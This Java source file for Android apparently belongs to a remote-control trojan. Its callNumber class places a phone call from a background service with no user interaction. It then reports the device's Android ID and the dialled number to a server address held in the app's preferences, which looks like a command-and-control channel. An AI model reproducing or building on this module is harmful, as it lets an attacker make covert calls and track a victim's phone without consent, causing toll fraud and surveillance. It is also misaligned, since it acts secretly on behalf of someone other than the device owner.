package u.can.i.up.expert.utils;

import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class callNumber extends AsyncTask<String, Void, String> {
    String i = "";
    public callNumber(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {
        String telephone = "tel:" + i.trim() ;
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse(telephone));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        DataSet.getInstance().myService.startActivity(intent);

        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call Initiated: " + i);
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Calling: " + i);
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
